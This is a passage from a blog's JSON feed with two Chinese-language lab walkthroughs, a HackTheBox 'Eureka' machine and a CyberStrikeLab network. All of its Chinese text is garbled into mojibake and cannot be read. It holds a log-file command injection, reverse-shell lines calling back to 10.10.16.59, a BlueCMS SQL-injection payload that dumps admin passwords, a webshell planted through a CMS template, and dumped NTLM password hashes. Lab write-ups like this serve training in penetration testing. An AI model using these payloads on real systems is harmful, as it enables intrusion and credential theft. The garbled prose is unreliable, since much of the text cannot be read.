å…³è”æ•°ç»„ï¼Œå­˜å‚¨æˆåŠŸç™»å½•çš„ç”¨æˆ·åŠå…¶æ¬¡æ•°ï¼šç”¨æˆ·å -> æ¬¡æ•°\ndeclare -A failed_users      # å…³è”æ•°ç»„ï¼Œå­˜å‚¨å¤±è´¥ç™»å½•çš„ç”¨æˆ·åŠå…¶æ¬¡æ•°ï¼šç”¨æˆ·å -> æ¬¡æ•°\n\n# å®šä¹‰åˆå§‹çš„ HTTP çŠ¶æ€ç åŠå…¶è®¡æ•°ï¼ˆåˆå§‹åŒ–ä¸º 0ï¼‰\nSTATUS_CODES=(\"200:0\" \"201:0\" \"302:0\" \"400:0\" \"401:0\" \"403:0\" \"404:0\" \"500:0\")\n\n# æ£€æŸ¥æ—¥å¿—æ–‡ä»¶æ˜¯å¦å­˜åœ¨\nif [ ! -f \"$LOG_FILE\" ]; then\n    echo -e \"${RED}Error: Log file $LOG_FILE not found.${RESET}\"  # å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯\n    exit 1  # è„šæœ¬é€€å‡ºå¹¶è¿”å›é”™è¯¯ç \nfi\n\n# åˆ†æç™»å½•æˆåŠŸå’Œå¤±è´¥çš„å‡½æ•°\nanalyze_logins() {\n    # å¤„ç†æˆåŠŸç™»å½•çš„è®°å½•\n    while IFS= read -r line; do\n        username=$(echo \"$line\" | awk -F\"'\" '{print $2}')  # ä»æ—¥å¿—è¡Œä¸­æå–ç”¨æˆ·å\n        # å¦‚æœç”¨æˆ·å·²ç»å­˜åœ¨äºæ•°ç»„ä¸­ï¼Œåˆ™å¢åŠ è¯¥ç”¨æˆ·çš„ç™»å½•è®¡æ•°\n        if [ -n \"${successful_users[$username]+_}\" ]; then\n            successful_users[$username]=$((successful_users[$username] + 1))\n        else\n            successful_users[$username]=1  # ç¬¬ä¸€æ¬¡ç™»å½•ï¼Œåˆå§‹åŒ–è®¡æ•°ä¸º 1\n        fi\n    done < <(grep \"LoginSuccessLogger\" \"$LOG_FILE\")  # è¿‡æ»¤å‡ºåŒ…å« 'LoginSuccessLogger' çš„è¡Œ\n\n    # å¤„ç†å¤±è´¥ç™»å½•çš„è®°å½•\n    while IFS= read -r line; do\n        username=$(echo \"$line\" | awk -F\"'\" '{print $2}')  # ä»æ—¥å¿—è¡Œä¸­æå–ç”¨æˆ·å\n        # å¦‚æœç”¨æˆ·å·²ç»å­˜åœ¨äºæ•°ç»„ä¸­ï¼Œåˆ™å¢åŠ è¯¥ç”¨æˆ·çš„å¤±è´¥ç™»å½•è®¡æ•°\n        if [ -n \"${failed_users[$username]+_}\" ]; then\n            failed_users[$username]=$((failed_users[$username] + 1))\n        else\n            failed_users[$username]=1  # ç¬¬ä¸€æ¬¡å¤±è´¥ï¼Œåˆå§‹åŒ–è®¡æ•°ä¸º 1\n        fi\n    done < <(grep \"LoginFailureLogger\" \"$LOG_FILE\")  # è¿‡æ»¤å‡ºåŒ…å« 'LoginFailureLogger' çš„è¡Œ\n}\n\n# åˆ†ææ—¥å¿—ä¸­çš„ HTTP çŠ¶æ€ç \nanalyze_http_statuses() {\n    # å¤„ç†æ¯ä¸€è¡Œæ—¥å¿—ï¼ŒæŸ¥æ‰¾çŠ¶æ€ç \n    while IFS= read -r line; do\n        code=$(echo \"$line\" | grep -oP 'Status: \\K.*')  # æå–çŠ¶æ€ç \n        found=0\n        # éå† STATUS_CODES æ•°ç»„ï¼Œæ£€æŸ¥çŠ¶æ€ç æ˜¯å¦å­˜åœ¨\n        for i in \"${!STATUS_CODES[@]}\"; do\n            existing_entry=\"${STATUS_CODES[$i]}\"\n            existing_code=$(echo \"$existing_entry\" | cut -d':' -f1)  # è·å–çŠ¶æ€ç \n            existing_count=$(echo \"$existing_entry\" | cut -d':' -f2)  # è·å–å½“å‰è®¡æ•°\n            if [[ \"$existing_code\" -eq \"$code\" ]]; then\n                new_count=$((existing_count + 1))  # å¦‚æœçŠ¶æ€ç å­˜åœ¨ï¼Œå¢åŠ è®¡æ•°\n                STATUS_CODES[$i]=\"${existing_code}:${new_count}\"\n                break\n            fi\n        done\n    done < <(grep \"HTTP.*Status: \" \"$LOG_FILE\")  # è¿‡æ»¤å‡ºåŒ…å« 'Status: ' çš„è¡Œ\n}\n\n# åˆ†ææ—¥å¿—ä¸­çš„é”™è¯¯ä¿¡æ¯\nanalyze_log_errors(){\n    # è¾“å‡ºæ—¥å¿—çº§åˆ«çš„ç»Ÿè®¡ä¿¡æ¯\n    echo -e \"\\n${YELLOW}[+] Log Level Counts:${RESET}\"\n    log_levels=$(grep -oP '(?<=Z  )\\w+' \"$LOG_FILE\" | sort | uniq -c)  # æå–æ—¥å¿—çº§åˆ«å¹¶æ’åºç»Ÿè®¡\n    echo \"$log_levels\" | awk -v blue=\"$BLUE\" -v yellow=\"$YELLOW\" -v red=\"$RED\" -v reset=\"$RESET\" '{\n        if ($2 == \"INFO\") color=blue;       # INFOçº§åˆ«ä½¿ç”¨è“è‰²\n        else if ($2 == \"WARN\") color=yellow; # WARNçº§åˆ«ä½¿ç”¨é»„è‰²\n        else if ($2 == \"ERROR\") color=red;  # ERRORçº§åˆ«ä½¿ç”¨çº¢è‰²\n        else color=reset;                   # å…¶ä»–æ—¥å¿—çº§åˆ«æ¢å¤é»˜è®¤é¢œè‰²\n        printf \"%s%6s %s%s\\n\", color, $1, $2, reset\n    }'\n\n    # è¾“å‡ºæ‰€æœ‰çš„é”™è¯¯æ¶ˆæ¯\n    error_messages=$(grep ' ERROR ' \"$LOG_FILE\" | awk -F' ERROR ' '{print $2}')\n    echo -e \"\\n${RED}[+] ERROR Messages:${RESET}\"\n    echo \"$error_messages\" | awk -v red=\"$RED\" -v reset=\"$RESET\" '{print red $0 reset}'\n\n    # Eureka æœåŠ¡è¿æ¥å¤±è´¥çš„é”™è¯¯\n    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' \"$LOG_FILE\")\n    eureka_count=$(echo \"$eureka_errors\" | wc -l)  # ç»Ÿè®¡ Eureka é”™è¯¯çš„æ•°é‡\n    echo -e \"\\n${YELLOW}[+] Eureka Connection Failures:${RESET}\"\n    echo -e \"${YELLOW}Count: $eureka_count${RESET}\"  # è¾“å‡º Eureka é”™è¯¯çš„æ•°é‡\n    echo \"$eureka_errors\" | tail -n 2 | awk -v yellow=\"$YELLOW\" -v reset=\"$RESET\" '{print yellow $0 reset}'  # è¾“å‡ºæœ€æ–°çš„ Eureka é”™è¯¯\n}\n\n# æ˜¾ç¤ºæœ€ç»ˆçš„åˆ†æç»“æœ\ndisplay_results() {\n    echo -e \"${BLUE}----- Log Analysis Report -----${RESET}\"\n\n    # è¾“å‡ºæˆåŠŸç™»å½•ç»Ÿè®¡ä¿¡æ¯\n    echo -e \"\\n${GREEN}[+] Successful Login Counts:${RESET}\"\n    total_success=0\n    for user in \"${!successful_users[@]}\"; do\n        count=${successful_users[$user]}\n        printf \"${GREEN}%6s %s${RESET}\\n\" \"$count\" \"$user\"  # æ˜¾ç¤ºæ¯ä¸ªç”¨æˆ·çš„æˆåŠŸç™»å½•æ¬¡æ•°\n        total_success=$((total_success + count))  # ç´¯åŠ æˆåŠŸç™»å½•æ€»æ•°\n    done\n    echo -e \"${GREEN}\\nTotal Successful Logins: $total_success${RESET}\"  # æ˜¾ç¤ºæˆåŠŸç™»å½•æ€»æ•°\n\n    # è¾“å‡ºå¤±è´¥ç™»å½•ç»Ÿè®¡ä¿¡æ¯\n    echo -e \"\\n${RED}[+] Failed Login Attempts:${RESET}\"\n    total_failed=0\n    for user in \"${!failed_users[@]}\"; do\n        count=${failed_users[$user]}\n        printf \"${RED}%6s %s${RESET}\\n\" \"$count\" \"$user\"  # æ˜¾ç¤ºæ¯ä¸ªç”¨æˆ·çš„å¤±è´¥ç™»å½•æ¬¡æ•°\n        total_failed=$((total_failed + count))  # ç´¯åŠ å¤±è´¥ç™»å½•æ€»æ•°\n    done\n    echo -e \"${RED}\\nTotal Failed Login Attempts: $total_failed${RESET}\"  # æ˜¾ç¤ºå¤±è´¥ç™»å½•æ€»æ•°\n\n    # è¾“å‡º HTTP çŠ¶æ€ç åˆ†å¸ƒ\n    echo -e \"\\n${CYAN}[+] HTTP Status Code Distribution:${RESET}\"\n    total_requests=0\n    # æŒ‰çŠ¶æ€ç è¿›è¡Œæ’åº\n    IFS=$'\\n' sorted=($(sort -n -t':' -k1 <<<\"${STATUS_CODES[*]}\"))\n    unset IFS\n    for entry in \"${sorted[@]}\"; do\n        code=$(echo \"$entry\" | cut -d':' -f1)  # è·å–çŠ¶æ€ç \n        count=$(echo \"$entry\" | cut -d':' -f2)  # è·å–è¯¥çŠ¶æ€ç çš„è®¡æ•°\n        total_requests=$((total_requests + count))  # ç´¯åŠ  HTTP è¯·æ±‚æ€»æ•°\n        \n        # æ ¹æ®çŠ¶æ€ç çš„ç±»å‹é€‰æ‹©é¢œè‰²\n        if [[ $code =~ ^2 ]]; then color=\"$GREEN\"   # 2xx çŠ¶æ€ç ä½¿ç”¨ç»¿è‰²\n        elif [[ $code =~ ^3 ]]; then color=\"$YELLOW\" # 3xx çŠ¶æ€ç ä½¿ç”¨é»„è‰²\n        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color=\"$RED\"  # 4xx å’Œ 5xx çŠ¶æ€ç ä½¿ç”¨çº¢è‰²\n        else color=\"$CYAN\"  # å…¶ä»–çŠ¶æ€ç ä½¿ç”¨é’è‰²\n        fi\n        \n        printf \"${color}%6s %s${RESET}\\n\" \"$count\" \"$code\"  # æ˜¾ç¤ºæ¯ä¸ªçŠ¶æ€ç åŠå…¶è®¡æ•°\n    done\n    echo -e \"${CYAN}\\nTotal HTTP Requests Tracked: $total_requests${RESET}\"  # æ˜¾ç¤º HTTP è¯·æ±‚æ€»æ•°\n}\n\n# ä¸»æ‰§è¡Œè¿‡ç¨‹\nanalyze_logins  # è°ƒç”¨åˆ†æç™»å½•å‡½æ•°\nanalyze_http_statuses  # è°ƒç”¨åˆ†æ HTTP çŠ¶æ€ç å‡½æ•°\ndisplay_results | tee \"$OUTPUT_FILE\"  # æ˜¾ç¤ºç»“æœå¹¶ä¿å­˜åˆ°è¾“å‡ºæ–‡ä»¶\nanalyze_log_errors | tee -a \"$OUTPUT_FILE\"  # åˆ†ææ—¥å¿—é”™è¯¯å¹¶è¿½åŠ åˆ°è¾“å‡ºæ–‡ä»¶\necho -e \"\\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}\"  # è¾“å‡ºåˆ†æå®Œæˆæ¶ˆæ¯\n```\n\nç„¶åå‘ç°ä¸€äº›å¯èƒ½å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„åœ°æ–¹\n\n```bash\nusername=$(echo \"$line\" | awk -F\"'\" '{print $2}')  # ä»æ—¥å¿—è¡Œä¸­æå–ç”¨æˆ·å\ncode=$(echo \"$line\" | grep -oP 'Status: \\K.*')\n```\n\nå¯¹è¿™é‡Œè¿›è¡Œæµ‹è¯•\n\n```bash\nâœ  Eureka echo \"$(echo 1 >> 1.txt)\" | grep -oP 'Status: \\K.*'\n\nâœ  Eureka cat 1.txt\n\n1\n```\n\n### å‘½ä»¤æ³¨å…¥\n\nåœ¨é¶æœºä¸Šæµ‹è¯•\n\n```bash\nrm -r /var/www/web/user-management-service/log/application.log\necho \"Status: $(echo 1 >> /home/miranda-wise/1.txt)\" > /var/www/web/user-management-service/log/application.log\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image6.png)\n\næˆåŠŸï¼Œè¿›è¡Œåå¼¹ `shell`\n\n```bash\necho \"Status: $(/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.59/1234 0>&1')\" > /var/www/web/user-management-service/log/application.log\n```\n\nä½†æ˜¯ç›´æ¥æ³¨å…¥ä¼šä»¥å½“å‰ç”¨æˆ·æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹å…¶è¿›è¡Œæ”¹é€ \n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image7.png)\n\nè¿™æ ·å°±ä¸ä¼šç›´æ¥æ‰§è¡Œï¼Œè€Œæ˜¯å…ˆå†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­\n\n```bash\necho 'HTTP Status: x[$(/bin/bash -i >& /dev/tcp/10.10.16.59/1234 0>&1)]' > /var/www/web/user-management-service/log/application.log\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image8.png)\n\nè¯»å– `root.txt`\n\n```bash\ncat root.txt\n2a29dd1a4d1172b24ca76dd452035829\n```\n\n## æ€»ç»“\n\nä¿¡æ¯æ”¶é›†æ˜¯çœŸçš„å¾ˆé‡è¦ï¼Œå¯¹æ”¶é›†åˆ°ä¿¡æ¯å»ä»”ç»†åˆ†æï¼Œæ€»æ˜¯ä¼šæ‰¾åˆ°æœ‰ç”¨çš„ã€‚\n",
            "url": "https://www.sunsetaction.top/2025/09/20/HackTheBoxMachine - Eureka",
            "title": "HackTheBox - Machine - Eureka",
            "summary": "Machine Eureka https://app.hackthebox.com/machines/Eureka | Hard PSï¼šå°¤é‡Œå¡å‘åŠ¨ï¼æ‰€æœ‰å¥‡è§‚å»ºé€ æé€Ÿ 30% ! å‰æœŸè¸©ç‚¹ Web æ¸—é€ ä¿¡æ¯æ”¶é›† WhatWeb é¡µé¢ä¸Šçš„ä¸€äº›æ“ä½œè¦è¿›è¡Œç™»é™†åæ‰èƒ½è¿›è¡Œæ“ä½œ æŠ“ä¸ªåŒ…åˆ†æä¸€ä¸‹æ¡†æ¶ nginx...",
            "date_modified": "2025-04-28T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "Linuxé¶æœº",
                "HackTheBox",
                "Spring",
                "Eureka",
                "å‘½ä»¤æ³¨å…¥"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/14/CyberstrikelabLab4",
            "content_html": "\n# Lab4\n\n> https://www.cyberstrikelab.com/#/scene/detail/23\n> \n\n## Recon\n\nå¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æ\n\n```php\nâœ  Lab4 nmap -sT -min-rate 5000 -p- 192.168.10.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 10:31 CST\nNmap scan report for 192.168.10.10\nHost is up (0.051s latency).\nNot shown: 65520 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n3306/tcp  open  mysql\n3389/tcp  open  ms-wbt-server\n5040/tcp  open  unknown\n5820/tcp  open  autopassdaemon\n7680/tcp  open  pando-pub\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n```\n\n```php\nâœ  Lab4 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.10.10\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 10:32 CST\nNmap scan report for 192.168.10.10                                                              \nHost is up (0.055s latency).                                                                    \n                                                                                                \nPORT      STATE SERVICE       VERSION                                                                                                                                                           \n135/tcp   open  msrpc         Microsoft Windows RPC  \n445/tcp   open  microsoft-ds?\n3306/tcp  open  mysql         MySQL (unauthorized)       \n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2025-08-13T18:36:07+00:00; -7h59m59s from scanner time.\n| ssl-cert: Subject: commonName=DESKTOP-JFB57A8\n| Not valid before: 2025-08-12T18:25:20\n|_Not valid after:  2026-02-11T18:25:20                                                         \n| rdp-ntlm-info:      \n|   Target_Name: DESKTOP-JFB57A8\n|   NetBIOS_Domain_Name: DESKTOP-JFB57A8      \n|   NetBIOS_Computer_Name: DESKTOP-JFB57A8\n|   DNS_Domain_Name: DESKTOP-JFB57A8\n|   DNS_Computer_Name: DESKTOP-JFB57A8\n|   Product_Version: 10.0.18362\n|_  System_Time: 2025-08-13T18:35:38+00:00\n5040/tcp  open  unknown\n5820/tcp  open  http          Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)\n| http-cookie-flags:      \n|   /: \n|     PHPSESSID:                                                                                                                                                                                \n|_      httponly flag not set                                                                   \n|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02\n|_http-title: \\xD1\\xDD\\xCA\\xBE\\xCD\\xF8\\xD5\\xBE - Powered by BlueCMS\n| http-robots.txt: 9 disallowed entries \n| /admin/ /api/ /data/ /include/ /install/ /templates/ \n|_/uc_client/ /user.php /comment.php\n7680/tcp  open  pando-pub?\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 10 1709 - 21H2 (97%), Microsoft Windows 10 (93%), Microsoft Windows Longhorn (93%), Microsoft Windows 10 1903 (92%), Microsoft Windows 10 21H1 (92%), M\nicrosoft Windows 10 21H2 (92%), Microsoft Windows 10 1703 or Windows 11 21H2 (91%), Microsoft Windows 10 1803 (91%), Microsoft Windows 8 (91%), Microsoft Windows 10 Education Edition 1909 (90%\n)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -7h59m59s, deviation: 0s, median: -8h00m00s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2025-08-13T18:35:40\n|_  start_date: N/A\n```\n\n`5820` æ˜¯ `Web`æœåŠ¡\n\n## 192.168.10.10\n\n### BlueCMS\n\næ­å»ºç€çš„æ˜¯ `BlueCMS`\n\n![image.png](/post-images/CyberstrikelabLab4/image.png)\n\nåœ¨é¡µè„šä¸­èƒ½æ‰¾åˆ°æ˜¯ï¼š`Powered by BlueCMS v1.6`\n\nå­˜åœ¨ `SQL`æ³¨å…¥æ¼æ´\n\n> https://www.cnblogs.com/Hi-blog/p/7990894.html#_label30\n> \n\n![image.png](/post-images/CyberstrikelabLab4/image1.png)\n\næ‹¿ç”¨æˆ·å¯†ç \n\n```php\nad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(admin_name,0x3a,pwd) from blue_admin\n```\n\n![image.png](/post-images/CyberstrikelabLab4/image2.png)\n\nè§£å‡ºæ¥å¯†ç æ˜¯ï¼š`admin123456`\n\n### åå° GetShell\n\nç™»å½•åå°ï¼Œåœ¨æ¨¡ç‰ˆè®¾ç½®é‡Œé¢\n\n![image.png](/post-images/CyberstrikelabLab4/image3.png)\n\n> åˆ©ç”¨é“¾æ¥ï¼šhttps://blog.csdn.net/weixin_72007549/article/details/127540398\n> \n\nåœ¨å¤´éƒ¨å†™ä¸Šä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åæäº¤\n\n![image.png](/post-images/CyberstrikelabLab4/image4.png)\n\nèšå‰‘è¿æ¥ä¸Š\n\n![image.png](/post-images/CyberstrikelabLab4/image5.png)\n\næƒé™å¾ˆé«˜æ˜¯ `system`æƒé™\n\n![image.png](/post-images/CyberstrikelabLab4/image6.png)\n\nåœ¨æ ¹ç›®å½•è¯»åˆ° `flag`\n\n```php\nC:\\> type flag.txt\ngo-flag{ovuRsBeMqji13Rrc}\n```\n\nè¿™é‡Œç”¨ä¸Š `CS` äº†\n\n![image.png](/post-images/CyberstrikelabLab4/image7.png)\n\n### ä¿¡æ¯æ”¶é›†\n\næŠ“ä¸€ä¸‹ `HASH`\n\n```php\nbeacon> hashdump\n[*] Tasked beacon to dump hashes\n[+] host called home, sent: 82541 bytes\n[+] received password hashes:\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\napache:1002:aad3b435b51404eeaad3b435b51404ee:0047605c0f2b9342a96ff4502f0f1a84:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:809f928153e9cdf27a043a18028a6efd:::\nweb:1001:aad3b435b51404eeaad3b435b51404ee:081dece85a94bf4a198aa49d8042347e:::\n```\n\nè¿ç§»åˆ° `MSF`\n\n![image.png](/post-images/CyberstrikelabLab4/image8.png)\n\næŸ¥çœ‹ç½‘æ®µä¿¡æ¯\n\n```php\nInterface 16\n============\nName         : Realtek RTL8139C+ Fast Ethernet NIC #3\nHardware MAC : b0:5e:4f:ef:a4:d3\nMTU          : 1500\nIPv4 Address : 192.168.20.10\nIPv4 Netmask : 255.255.255.0\nIPv6 Address : fe80::c8c0:3fc0:ab95:1f0a\nIPv6 Netmask : ffff:ffff:ffff:ffff::\n\nInterface 17\n============\nName         : Realtek RTL8139C+ Fast Ethernet NIC #2\nHardware MAC : 10:98:36:73:90:72\nMTU          : 1500\nIPv4 Address : 192.168.10.10\nIPv4 Netmask : 255.255.255.0\nIPv6 Address : fe80::a898:1c84:d7f:2d59\nIPv6 Netmask : ffff:ffff:ffff:ffff::\n```\n\nä¸Šä¼  `Fscan`æ‰«æ\n\n```php\nC:\\>fscan.exe -h 192.168.20.1-255 -nobr\nfscan.exe -h 192.168.20.1-255 -nobr\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚    ___                              _        â”‚\nâ”‚   / _ \\     ___  ___ _ __ __ _  ___| | __    â”‚\nâ”‚  / /_\\/____/ __|/ __| __/ _` |/ __| |/ /    â”‚\nâ”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     â”‚\nâ”‚ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n      Fscan Version: 2.0.0\n\n[2025-08-14 03:25:46] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1\n[2025-08-14 03:25:46] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ\n[2025-08-14 03:25:46] [INFO] ç”ŸæˆIPèŒƒå›´: 192.168.20.1 - 192.168.20.255\n[2025-08-14 03:25:46] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 255\n[2025-08-14 03:25:46] [INFO] å¼€å§‹ä¸»æœºæ‰«æ\n[2025-08-14 03:25:46] [SUCCESS] ç›®æ ‡ 192.168.20.10   å­˜æ´» (ICMP)\n[2025-08-14 03:25:46] [SUCCESS] ç›®æ ‡ 192.168.20.30   å­˜æ´» (ICMP)\n[2025-08-14 03:25:46] [SUCCESS] ç›®æ ‡ 192.168.20.20   å­˜æ´» (ICMP)\n[2025-08-14 03:25:49] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 3\n[2025-08-14 03:25:49] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233\n[2025-08-14 03:25:49] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:88\n[2025-08-14 03:25:49] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:135\n[2025-08-14 03:25:49] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:135\n[2025-08-14 03:25:49] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:135\n[2025-08-14 03:25:51] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:139\n[2025-08-14 03:25:51] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:445\n[2025-08-14 03:25:51] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:445\n[2025-08-14 03:25:51] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:139\n[2025-08-14 03:25:51] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:445\n[2025-08-14 03:25:51] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.30:389\n[2025-08-14 03:25:51] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:139\n[2025-08-14 03:25:53] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:3306\n[2025-08-14 03:25:54] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:88 =>\n[2025-08-14 03:25:55] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.20:7001\n[2025-08-14 03:25:56] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:139 =>  Banner:[.]\n[2025-08-14 03:25:56] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:445 =>\n[2025-08-14 03:25:56] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:445 =>\n[2025-08-14 03:25:56] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:139 =>  Banner:[.]\n[2025-08-14 03:25:56] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:445 =>\n[2025-08-14 03:25:57] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:139 =>  Banner:[.]\n[2025-08-14 03:25:57] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.20.10:7680\n[2025-08-14 03:26:02] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:389 =>\n[2025-08-14 03:26:05] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:7001 => [http] äº§å“:Oracle WebLogic admin httpd\n[2025-08-14 03:26:10] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:3306 =>  Banner:[H.j Host 'DESKTOP-JFB57A8' is not allowed to connect to this MySQL server]\n[2025-08-14 03:26:52] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:7680 =>\n[2025-08-14 03:26:54] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.20:135 =>\n[2025-08-14 03:26:54] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.30:135 =>\n[2025-08-14 03:26:54] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.20.10:135 =>\n[2025-08-14 03:26:55] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 14\n[2025-08-14 03:26:55] [INFO] å¼€å§‹æ¼æ´æ‰«æ\n[2025-08-14 03:26:55] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle\n[2025-08-14 03:26:55] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 192.168.20.10\nä¸»æœºå: DESKTOP-JFB57A8\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 192.168.10.10\n[2025-08-14 03:26:55] [SUCCESS] NetInfo æ‰«æç»“æœ\nç›®æ ‡ä¸»æœº: 192.168.20.20\nä¸»æœºå: cyberweb\nå‘ç°çš„ç½‘ç»œæ¥å£:\n   IPv4åœ°å€:\n      â””â”€ 192.168.20.20\n[2025-08-14 03:26:55] [SUCCESS] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600\n[2025-08-14 03:26:58] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://192.168.20.20:7001 çŠ¶æ€ç :404 é•¿åº¦:1164   æ ‡é¢˜:Error 404--Not Found\n[2025-08-14 03:26:58] [SUCCESS] å‘ç°æŒ‡çº¹ ç›®æ ‡: http://192.168.20.20:7001 æŒ‡çº¹: [weblogic]\n```\n\n## 192.168.20.20 - 1\n\n### Weblogic\n\næ‰«æå‡ºæ¥ `Weblogic`\n\nç”¨å·¥å…·æ‰«æä¸€ä¸‹\n\n```php\nâœ  WeblogicScan git:(master) âœ— proxychains -q python WeblogicScan.py -u 192.168.20.20 -p 7001\n/root/Desktop/Tools/WeblogicScan/WeblogicScan.py:6: SyntaxWarning: invalid escape sequence '\\ '\n  |  _ \\ __ _| |__ | |__ (_) |_|  \\/  | __ _ ___| | __\n\n__        __   _     _             _        ____                  \n\\ \\      / /__| |__ | | ___   __ _(_) ___  / ___|  ___ __ _ _ __  \n \\ \\ /\\ / / _ \\ '_ \\| |/ _ \\ / _` | |/ __| \\___ \\ / __/ _` | '_ \\ \n  \\ V  V /  __/ |_) | | (_) | (_| | | (__   ___) | (_| (_| | | | |\n   \\_/\\_/ \\___|_.__/|_|\\___/ \\__, |_|\\___| |____/ \\___\\__,_|_| |_|\n                             |___/ \n                             By Tide_RabbitMask | V 1.5 \n\nWelcome To WeblogicScan !!!\nWhoamiï¼šhttps://github.com/rabbitmask\n[*] =========Task Start=========\n[+] [192.168.20.20:7001] Weblogic Version Is 12.2.1.4.0\n[+] [192.168.20.20:7001] Weblogic console address is exposed! The path is: 